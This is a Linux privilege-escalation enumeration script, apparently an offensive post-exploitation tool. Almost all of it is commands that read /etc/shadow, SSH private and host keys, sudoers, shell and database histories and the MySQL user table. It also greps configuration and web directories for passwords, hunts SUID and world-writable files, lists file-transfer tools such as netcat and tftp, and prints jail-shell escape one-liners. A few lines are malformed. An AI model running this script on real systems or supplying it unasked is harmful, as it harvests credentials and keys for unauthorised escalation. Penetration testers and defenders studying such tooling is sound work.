#!/bin/sh
#
#      `7MN.   `7MF'       
# __,    MMN.    M         
#`7MM    M YMb   M  pd""b. 
#  MM    M  `MN. M (O)  `8b
#  MM    M   `MM.M      ,89
#  MM    M     YMM    ""Yb.
#.JMML..JML.    YM       88
#                  (O)  .M'
#                   bmmmd' 
#                  
echo "-[Linux Privilege Escalation Script by 1N3]=--"
echo "-[https://crowdshield.com]=--"
echo ""
echo "#>01 Whats the distribution type? What version?"
echo "#>02 What's the Kernel version? Is it 64-bit?"
echo "#>03 What can be learnt from the environmental variables?"
echo "#>04 Is there a printer?"
echo "#>05 What services are running? Which service has which user"
echo "#>06 Which service(s) are been running by root? Of these services, which are vulnerable - its worth a double check!"
echo "#>07 What applications are installed? What version are they? Are they currently running?"
echo "#>08 Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?"
echo "#>09 What jobs are scheduled?"
echo "#>10 Any plain text usernames and/or passwords?"
echo "#>11 What NIC(s) does the system have? Is it connected to another network?"
echo "#>12 What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?"
echo "#>13 Whats cached? IP and/or MAC addresses"
echo "#>14 Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?"
echo "#>15 What sensitive files can be found?"
echo "#>16 Anything interesting in the home directorie(s)? If its possible to access"
echo "#>17 Are there any passwords in scripts, databases, configuration files or log files? Default paths and locations for passwords"
echo "#>18 What has the user being doing? Is there any password in plain text? What have they been edting?"
echo "#>19 What user information can be found?"
echo "#>20 Can private-key information be found?"
echo "#>21 Which configuration files can be written in /etc/? Able to reconfigure a service?"
echo "#>22 What can be found in /var/?"
echo "#>23 Any settings/files (hidden) on website? Any settings file with database information?"
echo "#>24 Is there anything in the log file(s) (Could help with Local File Includes!)"
echo "#>25 If commands are limited, you break out of the jail shell?"
echo "#>26 How are file-systems mounted?"
echo "#>27 Are there any unmounted file-systems?"
echo "#>28 Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here"
echo "#>29 SGID (chmod 2000) - run as the  group, not the user who started it."
echo "#>30 SUID (chmod 4000) - run as the  owner, not the user who started it."
echo "#>31 SGID or SUID"
echo "#>32 Where can written to and executed from? A few common places: /tmp, /var/tmp, /dev/shm"
echo "#>33 world-writeable folders"
echo "#>34 world-writeable & executable folders"
echo "#>35 Any problem files? Word-writeable, nobody files"
echo "#>36 world-writeable files"
echo "#>37 Noowner files"
echo "#>38 What development tools/languages are installed/supported?"
echo "#>39 How can files be uploaded?"
echo ""
echo ""
echo ""
echo "#>01 Whats the distribution type? What version?"
echo "#####################################################################"
cat /etc/issue
cat /etc/*-release
echo ""
echo "#>02 What's the Kernel version? Is it 64-bit?"
echo "#####################################################################"
cat /proc/version 
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
echo ""
echo "#>03 What can be learnt from the environmental variables?"
echo "#####################################################################"
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
echo ""
echo "#>04 Is there a printer?"
echo "#####################################################################"
lpstat -a
echo ""
echo "#>05 What services are running? Which service has which user"
echo "#####################################################################"
netstat -tulnpe
ps -ef
cat /etc/service
echo ""
echo "Listing all running processes..."
ps -auxxx
echo ""
echo "#>06 Which service(s) are been running by root? Of these services, which are vulnerable - its worth a double check!"
echo "#####################################################################"
ps aux | grep root
echo ""
echo "#>07 What applications are installed? What version are they? Are they currently running?"
echo "#####################################################################"
#ls -alh /usr/bin/
#ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
echo ""
echo "#>08 Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?"
echo "#####################################################################"
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/'
echo ""
echo "#>09 What jobs are scheduled?"
echo "#####################################################################"
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
echo ""
echo "#>10 Any plain text usernames and/or passwords?"
echo "#####################################################################"
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
echo ""
echo "#>11 What NIC(s) does the system have? Is it connected to another network?"
echo "#####################################################################"
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
echo ""
echo "#>12What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?"
echo "#####################################################################"
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
cat /etc/hosts
arp
ifconfig -a
iptables -L
hostname
dnsdomainname
echo ""
echo "What other users & hosts are communicating with the system?"
lsof -i
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w
echo ""
echo "#>13 Whats cached? IP and/or MAC addresses"
echo "#####################################################################"
arp -e
route
/sbin/route -nee
echo ""
echo "#>14 Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?"
echo "#####################################################################"
id
who
w
last
cat /etc/passwd | cut -d:    # List of users
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
cat /etc/sudoers
echo ""
echo "#>15 What sensitive files can be found?"
echo "#####################################################################"
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/
echo ""
echo "#>16 Anything interesting in the home directorie(s)? If its possible to access"
echo "#####################################################################"
ls -ahlR /root/
ls -ahlR /home/
echo ""
echo "#>17 Are there any passwords in scripts, databases, configuration files or log files? Default paths and locations for passwords"
echo "#####################################################################"
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg
egrep -i pass * -Rn /etc/
egrep -i pass * -Rn /var/www/
echo ""
echo "#>18 What has the user being doing? Is there any password in plain text? What have they been edting?"
echo "#####################################################################"
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
echo ""
echo "#>19 What user information can be found?"
echo "#####################################################################"
cat ~/.bashrc
cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root
echo ""
echo "#>20 Can private-key information be found?"
echo "#####################################################################"
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
echo ""
echo "#>21 Which configuration files can be written in /etc/? Able to reconfigure a service?"
echo "#####################################################################"
find /etc -user $USER
echo ""
echo "#>22 What can be found in /var/?"
echo "#####################################################################"
ls -alh /var/log
ls -alh /var/mail
ls -alh /var/spool
ls -alh /var/spool/lpd
ls -alh /var/lib/pgsql
ls -alh /var/lib/mysql
cat /var/lib/dhcp3/dhclient.leases
echo ""
echo "#>23 Any settings/files (hidden) on website? Any settings file with database information?"
echo "#####################################################################"
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/
ls -alhR /var/www/html/
echo ""
echo "#>24 Is there anything in the log file(s) (Could help with Local File Includes!)"
echo "# http://www.thegeekstuff.com/2011/08/linux-var-log-files/"
echo "#####################################################################"
#cat /etc/httpd/logs/access_log
#cat /etc/httpd/logs/access.log
#cat /etc/httpd/logs/error_log
#cat /etc/httpd/logs/error.log
#cat /var/log/apache2/access_log
#cat /var/log/apache2/access.log
#cat /var/log/apache2/error_log
#cat /var/log/apache2/error.log
#cat /var/log/apache/access_log
#cat /var/log/apache/access.log
#cat /var/log/auth.log
#cat /var/log/chttp.log
#cat /var/log/cups/error_log
#cat /var/log/dpkg.log
#cat /var/log/faillog
#cat /var/log/httpd/access_log
#cat /var/log/httpd/access.log
#cat /var/log/httpd/error_log
#cat /var/log/httpd/error.log
#cat /var/log/lastlog
#cat /var/log/lighttpd/access.log
#cat /var/log/lighttpd/error.log
#cat /var/log/lighttpd/lighttpd.access.log
#cat /var/log/lighttpd/lighttpd.error.log
#cat /var/log/messages
#cat /var/log/secure
#cat /var/log/syslog
#cat /var/log/wtmp
#cat /var/log/xferlog
#cat /var/log/yum.log
#cat /var/run/utmp
ls -alh /var/log/*
echo ""
echo "#>25 If commands are limited, you break out of the jail shell?"
echo "#####################################################################"
echo "python -c 'import pty;pty.spawn("/bin/bash")'"
echo "echo os.system('/bin/bash')"
echo "/bin/sh -i"
echo ""
echo "#>26 How are file-systems mounted?"
echo "#####################################################################"
mount
df -h
echo ""
echo "#>27 Are there any unmounted file-systems?"
echo "#####################################################################"
cat /etc/fstab
echo ""
#echo "#>28 Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here"
#find / -perm -1000 -type d 2>/dev/null   
#echo "#>29 SGID (chmod 2000) - run as the  group, not the user who started it."
#find / -perm -g=s -type f 2>/dev/null   
#echo "#>30 SUID (chmod 4000) - run as the  owner, not the user who started it."
#find / -perm -u=s -type f 2>/dev/null
#echo "#>31 SGID or UID"
#find / -perm -g=s -o -perm -u=s -type f -exec ls -l {} \; 2>/dev/null   
#for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f -exec ls -l {} \; 2>/dev/null; done
#find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
find / -type f -exec ls -l {} \; 2> /dev/null | egrep -i  "rwsr|rwxr-sr"
find / -perm +6000 -type f -exec ls -ld {} \;
#echo ""
echo "SUID OR GUID Writable files..."
echo "#####################################################################"
find / -o -group `id -g` -perm -g=w -perm -u=s \
 -o -perm -o=w -perm -u=s \
 -o -perm -o=w -perm -g=s \
 -ls 2>/dev/null 
find / -perm 02000 -o -perm -04000 2>/dev/null
echo ""
echo "#>32 Where can written to and executed from? A few common places: /tmp, /var/tmp, /dev/shm"
echo "#####################################################################"
mount  -l find / -path “$HOME” -prune -o -path “/proc” -prune -o \( ! -type l  \) \( -user `id -u` -perm -u=w  -o -group `id -g` -perm -g=w  -o -perm  -o=w \) -ls 2>/dev/null
echo ""
echo "#>33 world-writeable folders"
echo "#####################################################################"
find / -perm -o+w -type d -exec ls -lh {} \; 2>/dev/null   
echo ""
echo "#>36 world-writeable files"
echo "#####################################################################"
find / -perm -o+w -type f -exec ls -lh {} \; 2> /dev/null
echo "#>37 Noowner files"
echo "#####################################################################"
find /dir -xdev \( -nouser -o -nogroup \) -print  
echo ""
echo "#>38 What development tools/languages are installed/supported?"
echo "#####################################################################"
which perl
which gcc
which g++
which python
which php
which cc
echo ""
echo "#>39 How can files be uploaded?"
echo "#####################################################################"
which wget
which nc
which netcat
which scp
which ftp
which tftp
echo ""
echo "#####################################################################"
echo "#####################################################################"
echo "Done!"
